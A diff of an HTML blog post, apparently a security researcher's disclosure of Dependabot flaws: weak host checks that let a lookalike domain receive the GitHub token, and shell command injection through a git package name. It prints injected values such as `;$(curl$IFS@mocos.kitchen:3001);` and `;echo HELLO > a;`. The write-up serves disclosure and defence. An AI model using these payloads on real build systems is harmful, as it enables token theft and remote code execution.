@@ -49,7 +49,7 @@
     <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
 
     
-    <script src="/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+    <script src="/js/bundle.min.7136b4abac7b277aba8bc933917f4602d39a5c44f5590be687244bc86ef4f162.js" integrity="sha256-cTa0q6x7J3q6i8kzkX9GAtOaXET1WQvmhyRLyG708WI="></script>
 
     
 
@@ -197,7 +197,7 @@ So I started to look into Dependabot.</p>
 To start the investigation, I prepared an local Dependabot environment following <a href="https://github.com/dependabot/dependabot-script">the official sample code</a>.</p>
 <p>This sample code requires GitHub access token to fetch the source code of the repository.</p>
 <p><a href="https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23">https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>credentials <span style="color:#f92672">=</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>credentials <span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;type&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;git_source&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;host&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;github.com&#34;</span>,
@@ -209,12 +209,12 @@ This idea seems possible because there are flaws in URL validations.</p>
 <p>One of the validations is to check whether the URL contains <code>github.com</code> or not.
 Obviously, this validation accepts a URL such as <code>github.com.mocos.kitchen</code>.</p>
 <p><a href="https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8">https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>    <span style="color:#66d9ef">KNOWN_HOSTS</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/github\.com|bitbucket\.org|gitlab.com/i</span><span style="color:#f92672">.</span>freeze
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>    <span style="color:#66d9ef">KNOWN_HOSTS</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/github\.com|bitbucket\.org|gitlab.com/i</span><span style="color:#f92672">.</span>freeze
 </span></span></code></pre></div><p><a href="https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55">https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">raise</span> <span style="color:#66d9ef">Dependabot</span><span style="color:#f92672">::</span><span style="color:#66d9ef">GitDependenciesNotReachable</span>, <span style="color:#f92672">[</span>uri<span style="color:#f92672">]</span> <span style="color:#66d9ef">unless</span> uri<span style="color:#f92672">.</span>match?(<span style="color:#66d9ef">KNOWN_HOSTS</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">raise</span> <span style="color:#66d9ef">Dependabot</span><span style="color:#f92672">::</span><span style="color:#66d9ef">GitDependenciesNotReachable</span>, <span style="color:#f92672">[</span>uri<span style="color:#f92672">]</span> <span style="color:#66d9ef">unless</span> uri<span style="color:#f92672">.</span>match?(<span style="color:#66d9ef">KNOWN_HOSTS</span>)
 </span></span></code></pre></div><p>Another one uses following regexp which accepts a URL such as <code>git+https://github.com.mocos.kitchen/username/repo</code>.</p>
 <p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">GIT_URL_REGEX</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">%r{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      <span style="color:#66d9ef">GIT_URL_REGEX</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">%r{
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;git_prefix&gt;^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;username&gt;[a-z0-9-]+)/
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        (?&lt;repo&gt;[a-z0-9_.-]+)
@@ -228,7 +228,7 @@ Obviously, this validation accepts a URL such as <code>github.com.mocos.kitchen<
 <h2 id="token-stealing-demo">Token stealing demo</h2>
 <p>To proof this concept, I created <a href="https://github.com/tyage/dependabot-test-app">a sample repository</a> that includes following <code>package.json</code> file.</p>
 <p><a href="https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json">https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;dependencies&#34;</span>: {
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;package1&#34;</span>: <span style="color:#e6db74">&#34;git+https://github.com.mocos.kitchen/username/repo&#34;</span>
 </span></span><span style="display:flex;"><span>  }
@@ -246,7 +246,7 @@ Accept-Encoding: deflate, gzip
 <p>Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
 We can do this by simply creating a <code>.github/dependabot.yml</code> file.</p>
 <p><a href="https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml">https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span>---
 </span></span><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#ae81ff">2</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">updates</span>:
 </span></span><span style="display:flex;"><span>  - <span style="color:#f92672">package-ecosystem</span>: <span style="color:#ae81ff">npm</span>
@@ -266,7 +266,7 @@ Accept-Encoding: gzip
 <p>When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
 With the package name <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...</code>, a shell command <code>curl$IFS@mocos.kitchen:3001</code> was executed and we could see the request!</p>
 <p><a href="https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json">https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;javascript&#34;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;1.0.0&#34;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;main&#34;</span>: <span style="color:#e6db74">&#34;index.js&#34;</span>,
@@ -294,7 +294,7 @@ Here is what I could do:</p>
 I found that the command was executed in <code>run_npm_7_top_level_updater</code> method.
 In this method, the bot runs <code>npm install</code> command with <code>--ignore-scripts --package-lock-only</code> arguments so that it can see if the lock file is updated without running install scripts.</p>
 <p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>          command <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>          command <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
 </span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;npm&#34;</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;install&#34;</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>install_args,
@@ -306,7 +306,7 @@ In this method, the bot runs <code>npm install</code> command with <code>--ignor
 </span></span><span style="display:flex;"><span>          <span style="color:#f92672">].</span>join(<span style="color:#e6db74">&#34; &#34;</span>)
 </span></span></code></pre></div><p>Therefore, I thought Dependabot doesn&rsquo;t escape the arguments, but it does properly escapes all command arguments.</p>
 <p><a href="https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274">https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      cmd <span style="color:#f92672">=</span> allow_unsafe_shell_command ? command : escape_command(command)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>      cmd <span style="color:#f92672">=</span> allow_unsafe_shell_command ? command : escape_command(command)
 </span></span></code></pre></div><p>So I manually run <code>npm install</code> command to see what was happened and&hellip;</p>
 <pre tabindex="0"><code>$ npm install &#39;git+https://github.com/tyage/sample-package;echo HELLO &gt; a;&#39; --ignore-scripts
 npm ERR! code 127
@@ -326,7 +326,7 @@ HELLO
 Even if there is a <code>--ignore-scripts</code> option, we can execute a shell command injected in a package name!</p>
 <p>When we call <code>npm install</code> command with <code>git+https://...</code> package name, <code>git ls-remote</code> command is triggered using <code>child_process.spawn</code> method.</p>
 <p><a href="https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36">https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#a6e22e">proc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">spawn</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#a6e22e">args</span>, <span style="color:#a6e22e">opts</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#a6e22e">proc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">spawn</span>(<span style="color:#a6e22e">cmd</span>, <span style="color:#a6e22e">args</span>, <span style="color:#a6e22e">opts</span>)
 </span></span></code></pre></div><p>Also, if <code>child_process.spawn</code> method is called with <code>shell</code> option, <a href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">the command will be run inside of the shell</a>.</p>
 <p>npm passes <code>opts</code> variable, which contains npm config, as an option argument.
 It means <code>opts.shell</code> is same with <a href="https://docs.npmjs.com/cli/v7/using-npm/config#shell"><code>shell</code> config</a> which default value is a <code>$SHELL</code> environment variable or <code>bash</code> on Posix</p>
@@ -366,7 +366,7 @@ I asked if they issue CVE but they answered they will not.</p>
         <p>
             <a href="/posts/2021-04-02-improper-access-control-github-workflow/">
                 &#8592;
-                Previous:
+                :
                 Gain write permission of repositories with a bug in GitHub Actions
             </a>
         </p>
@@ -380,7 +380,7 @@ I asked if they issue CVE but they answered they will not.</p>
     <div class="next-post">
         <p>
             <a href="/posts/2023-03-12-acsc-2023-gotion/">
-                Next:
+                :
                 ACSC 2023 Gotion Challenge Author Writeup
                 &#8594;
             </a>
